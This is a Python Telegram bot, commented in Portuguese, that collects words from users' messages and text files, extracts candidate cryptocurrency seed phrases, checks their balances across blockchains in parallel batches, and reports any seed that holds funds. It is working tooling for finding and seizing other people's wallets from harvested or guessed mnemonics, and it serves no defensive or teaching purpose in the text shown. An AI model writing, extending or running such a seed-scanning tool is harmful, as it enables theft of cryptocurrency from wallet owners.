import os
import logging
import asyncio
import re
import tempfile
from aiohttp import web
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from blockchain_checker import check_balance_all
from seed_extractor import SeedExtractor

# Configuração de Logs
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configurações
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
PORT = int(os.getenv("PORT", 8080))
DOMAIN = os.getenv("RENDER_EXTERNAL_URL") or os.getenv("PUBLIC_DOMAIN")

extractor = SeedExtractor()
user_word_pools = {}
MAX_PARALLEL_SEEDS = 40

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 Bot Online e pronto para processar arquivos! Envie suas palavras ou arquivos .txt.")

async def clear_pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_word_pools[user_id] = []
    await update.message.reply_text("🗑️ Memória limpa.")

async def check_pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    words = user_word_pools.get(user_id, [])
    if not words:
        await update.message.reply_text("❌ Sem palavras. Envie texto ou arquivo primeiro.")
        return
    
    full_text = " ".join(words)
    seeds = extractor.extract_all_seeds(full_text)
    total = len(seeds)
    
    status_msg = await update.message.reply_text(f"⚡ Verificando {total} seeds...")
    
    found_count = 0
    for i in range(0, total, MAX_PARALLEL_SEEDS):
        batch = seeds[i:i + MAX_PARALLEL_SEEDS]
        results = await asyncio.gather(*[process_seed_silent(user_id, seed, update) for seed in batch], return_exceptions=True)
        found_count += sum(1 for r in results if isinstance(r, bool) and r)
        
        if (i + MAX_PARALLEL_SEEDS) < total:
            try: await status_msg.edit_text(f"🚀 Progresso: {min(i + MAX_PARALLEL_SEEDS, total)}/{total} | 🎯 Achados: {found_count}")
            except: pass
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"✅ Varredura Concluída. Total: {total} | Achados: {found_count}")

async def process_seed_silent(user_id, seed, update):
    try:
        res = await check_balance_all(seed)
        if res:
            s, found = res
            msg = f"🎯 **SALDO ENCONTRADO!**\n`{s}`\n"
            for c, a, b in found: msg += f"• {c}: {b}\n"
            await update.message.reply_text(msg, parse_mode='Markdown')
            return True
    except: pass
    return False

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_word_pools: user_word_pools[user_id] = []
    
    text = ""
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            await file.download_to_drive(tmp.name)
            with open(tmp.name, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
        os.unlink(tmp.name)
    else:
        text = update.message.text or ""
        
    new_words = re.findall(r'\b[a-z]+\b', text.lower())
    user_word_pools[user_id].extend(new_words)
    await update.message.reply_text(f"📥 {len(new_words)} palavras prontas. Use /check para iniciar.")

# --- Web Server para Health Check do Render ---
async def handle_root(request):
    return web.Response(text="Bot is running", status=200)

async def handle_webhook(request):
    app = request.app['bot_app']
    try:
        data = await request.json()
        update = Update.de_json(data, app.bot)
        await app.process_update(update)
    except Exception as e:
        logger.error(f"Webhook Error: {e}")
    return web.Response(status=200)

async def main():
    if not TOKEN:
        logger.error("TOKEN MISSING")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_pool))
    app.add_handler(CommandHandler("clear", clear_pool))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_input))

    await app.initialize()
    await app.start()

    # Configurar Webhook
    if DOMAIN:
        url = DOMAIN.replace("https://", "").replace("http://", "")
        webhook_url = f"https://{url}/{TOKEN}"
        await app.bot.set_webhook(webhook_url, drop_pending_updates=True)
        logger.info(f"Webhook set: {webhook_url}")

    # Iniciar Servidor Web
    web_app = web.Application()
    web_app['bot_app'] = app
    web_app.router.add_get('/', handle_root)
    web_app.router.add_post(f"/{TOKEN}", handle_webhook)

    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"Server started on port {PORT}")

    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
